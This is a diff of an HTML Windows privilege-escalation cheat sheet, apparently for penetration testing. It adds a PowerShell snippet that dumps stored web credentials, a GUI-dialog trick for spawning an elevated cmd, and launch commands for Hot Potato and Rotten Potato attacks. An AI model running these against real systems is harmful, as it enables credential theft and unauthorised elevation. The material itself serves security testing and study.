@@ -140,7 +140,7 @@
 
   <div>
         <div class="toc col-lg-3 hidden-xs hidden-sm">
-            <div id="toc"><ul><li><a class="toc-href" href="#generic-enumeration" title="Generic Enumeration">Generic Enumeration</a></li><li><a class="toc-href" href="#kernel-exploits" title="Kernel Exploits">Kernel Exploits</a></li><li><a class="toc-href" href="#service-exploits" title="Service Exploits">Service Exploits</a></li><li><a class="toc-href" href="#registry-exploits" title="Registry Exploits">Registry Exploits</a></li><li><a class="toc-href" href="#dumping-credentials" title="Dumping Credentials">Dumping Credentials</a></li></ul></div>
+            <div id="toc"><ul><li><a class="toc-href" href="#generic-enumeration" title="Generic Enumeration">Generic Enumeration</a></li><li><a class="toc-href" href="#kernel-exploits" title="Kernel Exploits">Kernel Exploits</a></li><li><a class="toc-href" href="#service-and-tasks-exploits" title="Service and Tasks Exploits">Service and Tasks Exploits</a></li><li><a class="toc-href" href="#registry-exploits" title="Registry Exploits">Registry Exploits</a></li><li><a class="toc-href" href="#dumping-credentials" title="Dumping Credentials">Dumping Credentials</a></li><li><a class="toc-href" href="#applications-exploits" title="Applications Exploits">Applications Exploits</a></li><li><a class="toc-href" href="#potatoes" title="Potatoes">Potatoes</a></li></ul></div>
         </div>
     <h2 id="generic-enumeration">Generic Enumeration</h2>
 <p>Run automated checks with various tools:</p>
@@ -187,7 +187,7 @@
 <div class="highlight"><pre><span></span><code>.<span class="se">\W</span>atson.exe
 </code></pre></div>
 <p>Some precompiled kernel exploits can be found <a href="https://github.com/SecWiki/windows-kernel-exploits">here</a>.</p>
-<h2 id="service-exploits">Service Exploits</h2>
+<h2 id="service-and-tasks-exploits">Service and Tasks Exploits</h2>
 <p>Enumerate vulnerable services:</p>
 <div class="highlight"><pre><span></span><code><span class="c1"># winPEAS</span>
 .<span class="se">\w</span>inPEASany.exe<span class="w"> </span>quiet<span class="w"> </span>servicesinfo
@@ -262,6 +262,12 @@ sc.exe<span class="w"> </span>&lt;Target<span class="w"> </span>Computer&gt;<spa
 <p>Get services where the current user can write to its binary path or change arguments to the binary (<code>PowerUp</code>): </p>
 <div class="highlight"><pre><span></span><code><span class="nb">Get-ModifiableServiceFile</span> <span class="n">-Verbose</span>
 </code></pre></div>
+<p>List scheduled tasks visible to current user:</p>
+<div class="highlight"><pre><span></span><code>schtasks<span class="w"> </span>/query<span class="w"> </span>/fo<span class="w"> </span>LIST<span class="w"> </span>/v
+</code></pre></div>
+<p>List scheduled tasks excluding system's tasks:</p>
+<div class="highlight"><pre><span></span><code><span class="nb">Get-ScheduledTask</span> <span class="p">|</span> <span class="nb">where </span><span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="n">TaskPath</span> <span class="o">-notlike</span> <span class="s2">"\Microsoft*"</span><span class="p">}</span> <span class="p">|</span> <span class="nb">ft </span><span class="n">TaskName</span><span class="p">,</span><span class="n">TaskPath</span><span class="p">,</span><span class="n">State</span>
+</code></pre></div>
 <h2 id="registry-exploits">Registry Exploits</h2>
 <p>Enumerate AutoRun executables:</p>
 <div class="highlight"><pre><span></span><code><span class="c1"># winPEAS</span>
@@ -294,7 +300,8 @@ reg<span class="w"> </span>query<span class="w"> </span>HKLM<span class="se">\S<
 <p>Check for <strong>AutoLogon</strong> credentials in registry:</p>
 <div class="highlight"><pre><span></span><code>reg<span class="w"> </span>query<span class="w"> </span><span class="s2">"HKLM\Software\Microsoft\WindowsNT\CurrentVersion\winlogon"</span>
 </code></pre></div>
-<p>Check for stored Putty sessions credentials in registry:</p>
+<p>Check for stored Putty sessions credentials in registry:
+reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s</p>
 <div class="highlight"><pre><span></span><code>reg<span class="w"> </span>query<span class="w"> </span><span class="s2">"HKCU\Software\SimonTatham\PuTTY\Sessions"</span><span class="w"> </span>/s
 </code></pre></div>
 <p>Search for clear-text passwords in registers:</p>
@@ -315,11 +322,10 @@ VaultCmd<span class="w"> </span>/listproperties:<span class="s2">"&lt;vault name
 <span class="c1"># list credentials in a vault</span>
 VaultCmd<span class="w"> </span>/listcreds:<span class="s2">"&lt;vault name&gt;"</span>
 </code></pre></div>
-<p>Dump credentials from the Windows Credentials Manager (see <a href="https://github.com/samratashok/nishang/blob/master/Gather/Get-WebCredentials.ps1">there</a>):</p>
-<div class="highlight"><pre><span></span><code><span class="nv">$ClassHolder</span> <span class="p">=</span> <span class="p">[</span><span class="n">Windows</span><span class="p">.</span><span class="n">Security</span><span class="p">.</span><span class="n">Credentials</span><span class="p">.</span><span class="n">PasswordVault</span><span class="p">,</span><span class="n">Windows</span><span class="p">.</span><span class="n">Security</span><span class="p">.</span><span class="n">Credentials</span><span class="p">,</span><span class="n">ContentType</span><span class="p">=</span><span class="n">WindowsRuntime</span><span class="p">]</span>
+<p>Dump credentials in the <strong>WebCredentials</strong> vault (see <a href="https://github.com/samratashok/nishang/blob/master/Gather/Get-WebCredentials.ps1">there</a>):</p>
+<div class="highlight"><pre><span></span><code><span class="nv">$ClassHolder</span> <span class="p">=[</span><span class="n">Windows</span><span class="p">.</span><span class="n">Security</span><span class="p">.</span><span class="n">Credentials</span><span class="p">.</span><span class="n">PasswordVault</span><span class="p">,</span><span class="n">Windows</span><span class="p">.</span><span class="n">Security</span><span class="p">.</span><span class="n">Credentials</span><span class="p">,</span><span class="n">ContentType</span><span class="p">=</span><span class="n">WindowsRuntime</span><span class="p">]</span>
 <span class="nv">$VaultObj</span> <span class="p">=</span> <span class="nb">new-object</span> <span class="n">Windows</span><span class="p">.</span><span class="n">Security</span><span class="p">.</span><span class="n">Credentials</span><span class="p">.</span><span class="n">PasswordVault</span>
 <span class="nv">$VaultObj</span><span class="p">.</span><span class="n">RetrieveAll</span><span class="p">()</span> <span class="p">|</span> <span class="k">foreach</span> <span class="p">{</span> <span class="nv">$_</span><span class="p">.</span><span class="n">RetrievePassword</span><span class="p">();</span> <span class="nv">$_</span> <span class="p">}</span>
-<span class="p">}</span>
 </code></pre></div>
 <p>List and use stored credentials with <code>runas</code>:</p>
 <div class="highlight"><pre><span></span><code><span class="c1"># List available stored credentials </span>
@@ -338,8 +344,47 @@ runas<span class="w"> </span>/savecred<span class="w"> </span>/user:&lt;user<spa
 <ul>
 <li><code>C:\Windows\Repair</code></li>
 <li><code>C:\Windows\System32\config\RegBack</code></li>
+<li><code>C:\Windows\Panther\Unattend.xml</code></li>
+<li><code>C:\Windows\Panther\Autounattend.xml</code></li>
 </ul>
 <p><strong>Take a also a look to <a href="https://ojack69.github.io/jacks-corner/ad/cheatsheet.html#dumping-credentials">Active Directory Cheatsheet - Dumping Credentials</a>.</strong></p>
+<h2 id="applications-exploits">Applications Exploits</h2>
+<p>In the "file browse" windows for a GUI app running with elevated privileges insert the following to spawn an elevated cmd:</p>
+<div class="highlight"><pre><span></span><code>file://c:/windows/system32/cmd.exe
+</code></pre></div>
+<p>Create a shortcut (<code>.lnk</code>) using PowerShell:</p>
+<div class="highlight"><pre><span></span><code><span class="nv">$WshShell</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">-COMObject</span> <span class="n">WScript</span><span class="p">.</span><span class="n">Shell</span>
+<span class="nv">$Shortcut</span> <span class="p">=</span> <span class="nv">$WshShell</span><span class="p">.</span><span class="n">CreateShortcut</span><span class="p">(</span><span class="s2">"&lt;destination .lnk file&gt;"</span><span class="p">)</span>
+<span class="nv">$Shortcut</span><span class="p">.</span><span class="n">TargetPath</span> <span class="p">=</span> <span class="s2">"&lt;target executable path&gt;"</span>
+<span class="nv">$Shortcut</span><span class="p">.</span><span class="n">Save</span><span class="p">()</span>
+</code></pre></div>
+<p>Create a shortcut (<code>.lnk</code>) using Visual Basic Script:</p>
+<div class="highlight"><pre><span></span><code>Set oWS = WScript.CreateObject("WScript.Shell")
+sLinkFile = "&lt;destination .lnk file&gt;"
+Set oLink = oWS.CreateShortcut(sLinkFile)
+oLink.TargetPath = "&lt;target executable path&gt;"
+oLink.Save
+</code></pre></div>
+<p>Run a <code>.vbs</code> file from cmd:</p>
+<div class="highlight"><pre><span></span><code>cscript<span class="w"> </span>&lt;vbs<span class="w"> </span>path&gt;
+</code></pre></div>
+<p>List running processes:</p>
+<div class="highlight"><pre><span></span><code>tasklist<span class="w"> </span>/v
+</code></pre></div>
+<p>Enumerate nonstandard processes:</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># Searbelt</span>
+.<span class="se">\s</span>eatbelt.exe<span class="w"> </span>NonstandardProcesses
+
+<span class="c1"># winPEAS</span>
+.<span class="se">\w</span>inPEASany.exe<span class="w"> </span>quiet<span class="w"> </span>procesinfo
+</code></pre></div>
+<h2 id="potatoes">Potatoes</h2>
+<p>Launch an <strong>Hot Potato</strong> attack from a low privileged user (binary <a href="https://github.com/foxglovesec/Potato/tree/master/source/Potato/Potato/bin/Release">here</a>):</p>
+<div class="highlight"><pre><span></span><code>.<span class="se">\p</span>otato.exe<span class="w"> </span>-ip<span class="w"> </span>&lt;target<span class="w"> </span>ip&gt;<span class="w"> </span>-cmd<span class="w"> </span><span class="s2">"&lt;command to execute&gt;"</span><span class="w"> </span>-enable_httpserver<span class="w"> </span><span class="nb">true</span><span class="w"> </span>-enable_defender<span class="w"> </span><span class="nb">true</span><span class="w"> </span>-enable_spoof<span class="w"> </span><span class="nb">true</span><span class="w"> </span>-enable_exhaust<span class="w"> </span><span class="nb">true</span>
+</code></pre></div>
+<p>Launch a Rotten Potato attack from a service account meterpreter shell with <em>incognito mode</em> enabled (binary <a href="https://github.com/breenmachine/RottenPotatoNG">here</a>):</p>
+<div class="highlight"><pre><span></span><code>MSFRottenPotato.exe<span class="w"> </span>t<span class="w"> </span>&lt;executable<span class="w"> </span>to<span class="w"> </span>run&gt;
+</code></pre></div>
   </div>
   <div class="tag-cloud">
     <p>
